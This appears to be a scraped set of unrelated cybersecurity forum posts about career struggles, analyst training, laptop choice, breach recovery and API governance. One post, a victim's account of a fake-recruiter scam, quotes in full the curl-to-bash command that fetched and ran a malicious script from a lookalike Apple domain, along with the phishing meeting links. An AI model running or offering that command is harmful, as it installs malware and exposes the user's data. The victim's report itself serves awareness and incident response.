      "text": "Cybersecurity sounds like such an amazing career choice on paper but the actual fight you have to go through to break in is insane.\n\nI’m on my 4th year of college and have heard literally every possible thing you could think of and nothing has worked, let alone even breaking into IT in general and this is coming from someone thats tangled around with computers since they were 3 years old now being 21.\n\nI have yet to be able to land an internship or a job being on my final year of schooling and I’ve done everything a student could possibly try to do to break in.\n\nGood ol’ help desk and support roles? - I tried applying for too many roles to count and every response is, “3+ years of experience needed, we only hire students enrolled at our school, we’ll get back to you (never do btw), bachelors needed” or all around just ghosted yet help desk is supposed to be the entry level point to dip your foot in the pool and build your way up right?\n\nProjects - I’ve done countless projects like Layer 2/ Layer 3 Switch configuration, setting up/using SIEMS, Active Directory and active attack simulations, Homelab setups, coding with python, creating a github to list all of my projects with screenshots + steps of how I did all of them, even created youtube videos in tutorials of how to do basic things needed for a cyber student in todays age. \n\nCertifications - I’ve gotten both my Security+ and AZ-900, yes AZ might be an entry-level cert but according to every person in cyber when I first started Security+ was supposed to be the holy grail to get a job in the field now its “not enough”. The $400 certification thats based around cybersecurity isn’t enough to get an entry job in cybersecurity? It makes no sense at all. \n\nNetworking - I’ve grown my LinkedIn for the past 2 years and have achieved getting +500 connections, contacting hiring managers/recruiters, reaching out to people in a position that I admire or even colleagues from school, posting about my projects or accomplishments and still nothing.\n\nAnd yet every day I hear “Don’t give up, once you get that first job you’ll be set after, Cyber isn’t an entry-level field, young people think it’s going to be simple”\n\nI 100% understand that it may not be simple but when students are breaking their necks to do everything possible to get even an internship in a field they signed up to take 4 years of schooling for + outside resources and networking of course I’m going to be upset if I can’t land a job. It’s years of wasted money and time that could’ve went to another field and at least almost guaranteed a career. At this point IT in general is almost on the path of becoming apart of the “useless degrees” category you’re warned about before you go into college. \n\nIts a continuous game of cat and mouse and is exactly why I say, if you’re an upcoming student or a current early student wanting to pursue cybersecurity save yourself while you still can. You’re in for a constant game of depression for years to come unless you get lucky.",

          "text": "think the most brutal part of cybersecurity isn’t the technical difficulty-it’s the misalignment between education and hiring reality.\nSchools sell cyber as “entry-level”, but the market treats it as a mid-career specialization. That gap is where most students get crushed.\nFrom what you describe, you didn’t “fail”. You did exactly what the system told you to do-projects, certs, homelabs, networking-and still hit a wall. That’s not on you.\nThe uncomfortable truth is that many people who eventually land cyber roles don’t enter through cyber at all. They come from sysadmin, networking, cloud ops, even non-IT roles where they slowly absorb trust and responsibility.\nIt doesn’t mean cybersecurity is useless. It means it’s badly marketed and poorly structured for newcomers.\nWhether you continue or pivot, just know this: your effort wasn’t wasted/but the path almost never looks like the one they advertise.",

              "text": "well said, I'm a director and manager of a small cyber security DFIR team, thats part of a bigger cyber group/company. \n\nIn my opinion, university \"cyber\" programs are focusing on the wrong things for entry level people. They are teaching the \"cool\" niche stuff.. but very little of the day to day common cyber aspects.. core networking, securing systems, securing networks.. log analytics. \n\nThats great you spent 3-4 yrs learning how to do malware reverse engineering.. but how many entry level positions are open for malware reverse engineering vs people that have a really strong foundational knowledge in secure programming, secure system building, and networking? These kinds of positions build your core and foundational knowledge you need to really get in the industry and more importantly STAY in the industry.. (not get laid off). This is where most people NEED to start. \n\nI say it in these channels over and over again.. getting a degree in CIS or CS isnt nearly as exciting but gives you all the knowledge you need to move into cyber OR 100 other technology directions.. Youre FAR more marketable in the cyber world and technology world in general with a degree in CIS or CS. You have a broad set of adaptable skills. \n\nOne other thing.. certs are great.. home labs are great.. but they are absolutely NOT the same as real world work experience.. and these days there is little to no excuse not to get some work experience while in school.. walk over to the university IT dept. \"hi am a Cyber/CS/CIS major.. I'm looking for opportunities to work and gain experience, what can I do? \".. do the same thing in your CS/CIS/Cyber dept. \n\nI can teach you the cyber aspect.. I cant, and dont have time to teach you how to work and interact in a real world office/work environment. how to stay on a schedule, multi-task, meet real deadlines with consequences.. take criticism.. present to people, work with others and have to do things you dont like or agree with bc your boss told you to do it. \n\nrealistically you are not going to work remotely straight out of school (you shouldn't, you need to be around other smart people you can learn from.. you cant do that through a zoom meeting)\n\n",

We are in an employers market, there are more job seekers in the US than there are job openings, and many of those are ghost jobs. No career field is guaranteed and have their own barriers to entry which in some cases can be even worse than cyber. But honestly the biggest thing I am personally seeing in this field is people limiting themselves. I see so many people saying the same 3 roles over and over again. Cyber isn't that limited of a field. There are tons of different niches, industries and more that it belongs in. Some of those roles are also very much in need of knowledgeable people who understand their industry. Look at nuclear, there is a need for people with cyber knowledge there but a lack of people who actually understand that industry. Same with law enforcement, OT security I believe also needs people too. I know just as many people in college who get cyber internships as people who do not, many of these people aren't unicorns either, hell I know people in cyber who snagged interviews and eventually got the internship just because they sent a follow up email.

This all stemmed from just putting 100% in when I was an intern to prove myself hence why they kept me on, that said most of my friends I went to university with most if not all I know have jobs in cybersecurity now within 2 years of graduating so don’t see it as a why am I not getting anything you just have to get that golden ticket and if worst comes to worst don’t go straight into cyber start lower and work your way in",

You're trying to process way too much at once.\n\nHere's what helped when we were training analysts at our company. Break down every alert into a simple workflow: who or what triggered it, when did it happen, what asset is affected, and is this normal for that asset. Even if you don't know the answer to all of those, that gives you a starting point for asking your senior.\n\nFor Splunk specifically, start with just learning how to pivot. If you see a source IP in an alert, learn how to search for all activity from that IP around the same timeframe. Same with usernames and hostnames. Don't worry about complex queries yet, just get comfortable navigating.\n\nThe overwhelm usually comes from trying to learn the tools AND the investigation process at the same time. Focus on the investigation logic first since that transfers across any tool. When we built CCDL1 at CyberDefenders, that's exactly what SOC managers from Mandiant and PwC kept emphasizing. The actual triage and escalation workflow is what trips up new analysts, not the tools.\n\nGive yourself a few weeks. Week one is supposed to feel chaotic.",

Make use of the schools partnerships to establish internships and coops when the time comes to help get you foot in the door to get experience which is of so much more value than a cert.\n\nIn the meantime read and study the A+, Sec+ and Network+ (can skip the ones you know or skim through) but don’t yet challenge the exams. The content is freely available on YouTube and elsewhere on the internet but they will set the tone and contain the foundations of what someone in cybersecurity would need to know.\n\nDon’t worry about projects unless you have an idea and a deep desire but I would hope your institution has a capstone to do before graduation and that will be your project.\n\nYou’re in your first year so I always advise to not worry about these things until it is clear that this is what you want. I don’t know the statistics but from personal experience in that first year I watched probably close to 40% of my classmates drop out or switch later and they too were all concerned for the certs and future prospects until it dawned on them that CS wasn’t for them.",

Discussions were smooth and he shared with me his Calendly in order to book an initial discussion about the role, the team etc (standard practice)\n\nHe shared with me a link to join the video call, which was \\`https://bitget-meeting.com/meet/934050553811?p=2eFFrUchalpVywTExG\\`.  I joined the call and the environment was identical to MS Teams. He joined after 3 mins but the video was frozen. I got a popup saying that you might have to install a driver to properly show video and audio for MS Teams. I stupidly clicked on the link \\`https://learn.bitget-meeting.com/en-us/troubleshoot/microsoftteams/teams-on-mac/teams-audio-issue-mac\\`, which was identical again to Microsoft webpages, and executed the following\n\n    /bin/bash -c \"$(curl -fsSL https://apple.driver-update.io/troubleshoot/mac/audio-issue-fix.sh)\"\n\nThe recruiter asked me for my phone number to call me and I had a 20 mins discussion about the role with an AI bot...\n\nAfter I stopped talking to it, I froze. I understood what I had done and decided to wipe the script and the downloaded binary from everywhere. ChatGPT was very helpful with the process and immediately identified that this script does indeed look harmful.\n\nI would like to ask you what more can I do to make sure that the downloaded binary did not install anything on my machine or my browser that might exfiltrate data? I have already checked:\n\n* Brave extensions\n* Removed the folder created by the sh script\n* I deleted the \\`coreaudiod\\` file. It cannot be found anywhere on my machine. No mention of \\`apple.driver-update.io\\` driver\n* No weird LaunchAgents or LaunchDaemons\n* Uninstalled Teams and Zoom (should have done this a long time ago)\n* Installed LuLu, NetIQuette and KnockKnock (no weird things there)",

But as I spoke to a salesman about upgrading to a Mac Pro with either an M4 or M5 Chip, he told me that going with a Windows laptop with either a Snapdragon or AMD chip would be a better choice (It might also make using Cyberseurity tools easier to use since I'm not 100% sure how exactly I would be able to access it from the NAS and if its practical enough to benefit from).\n\n  \nSo now im torn between going for a Macbook Pro with an M4 or M5 chip then running tools and programs incompatiable with MacOS on the NAS\n\nOR\n\nUpgrading to a Windows Snapdragon or AMD equivalent.

I don’t want to miss a great opportunity to join the Network team but I also don’t want to miss the opportunity to build my experience as a system admin.\n\nWhich role would put me in a better position to make more money and increase likely hood of scoring a cyber security role interview.

My company advised we make an IP PIN with the IRS and put credit freezes out with 3 companies (experian, I forgot the other two). I also filed my taxes last night after this happened. This is my first time dealing with potential stolen identity and that kind of threat. Is there anything else I should be doing to protect myself? The company said ALL personal info might be at risk (SSN, birthday, phone numbers, addresses, bank account numbers, credit cards, etc.) I just thought this sub might know. Thank you! ",

          "text": "Sorry to hear about this, data breaches suck, especially when it's due to a phishing. Your company gave solid starting advice with the IP PIN, and credit freezes. Just to fill in the blanks, the other two credit bureaus are Equifax and TransUnion, make sure you've frozen with all three to block new accounts from being opened in your name.Since all your personal info (SSN, DOB, addresses, bank details, etc.) could be out there, here's some specific, actionable steps to layer on top of what you've done. These are based on standard guidance from places like the FTC and credit agencies to minimize identity theft risks:\n\n1. Place a fraud alert on your credit reports: This is free and tells creditors to verify your identity before opening new accounts. Contact one bureau (e.g., Experian), and they'll notify the others. It lasts 1 year initially, or 7 years if you're already a victim of ID theft. Do this alongside the freezes for extra protection.\n2. Pull and monitor your credit reports: You're entitled to free weekly reports from AnnualCreditReport.com. Check for unfamiliar accounts, inquiries, or errors. Set up alerts with the bureaus for any changes.\n3. Change passwords and enable 2FA: Update passwords on all accounts, especially financial ones—use a password manager like Bitwarden (free) to generate strong, unique ones. Turn on two-factor authentication (2FA) everywhere possible to add a second layer against unauthorized access.\n4. Monitor your accounts closely: Review bank, credit card, and other statements daily/weekly for suspicious transactions. Set up transaction alerts via your bank's app. If bank details were exposed, consider closing and reopening accounts, but talk to your bank first.\n5. Watch for tax issues: You filed early, which is smart, it blocks scammers from filing a fake return. Keep an eye on mail from the IRS for any notices about duplicate filings or issues. If something pops up, respond quickly.\n6. Be extra vigilant against follow-up scams: With your phone/email exposed, expect more phishing attempts pretending to be from your company, IRS, or banks. Don't click links or share info—verify directly via official channels.\n7. Consider free credit monitoring if offered: Your company might provide this (many do after breaches). If not, services like Credit Karma or the bureaus' free tools can help track things. Paid identity theft protection (e.g., LifeLock) is an option for more comprehensive monitoring, but you can DIY a lot of it.\n\n IdentityTheft\\[.\\]gov for a personalized recovery plan, they have checklists based on what data was leaked.On the training side, since this started with a phishing scam, your company should absolutely roll out phishing awareness training to prevent repeats. It's not about blaming the person who fell for it—phishing is getting sneakier with AI-generated stuff—but educating everyone. Suggest they look into free resources like:\n\n* CISA's (Cybersecurity and Infrastructure Security Agency) free training materials and tabletop exercises for small teams.\n* KnowBe4's free Phishing Security Test to gauge how vulnerable employees are, plus their awareness training modules.\n* Terranova Security's free phishing kit with videos, infographics, and tips on spotting scams.\n* Wizer's free security awareness videos (1-minute bites) and phishing sims.\n\nFor yourself, take a quick free course like Amazon's 15-minute cybersecurity basics to sharpen your own skills. If the company doesn't act, maybe gently push HR—better training could save everyone from this headache again.Hang in there; acting fast like you did minimizes the damage.",

      "text": "We have about 200 microservices and every team does auth differently, some use oauth2, some still have basic auth somewhere, and one team built custom jwt validation that nobody else understands and security audits are a nightmare because there's no central view of what's actually exposed.\n\nCompliance keeps asking for reports on which apis have what security controls and i have to manually check repos and hope the docs are updated, spoiler they never are. rate limiting is all over the place, some services have it some don't, and when we get hit with traffic spikes it's anyone's guess what's gonna break first. Tried writing scripts to scan everything but they break every time someone changes their implementation. spent two months building a dashboard that was outdated the day we launched it because teams keep shipping changes without updating anything centrally.\n\nHow do other security teams handle api governance at scale? there has to be a better way than what we're doing, right?",
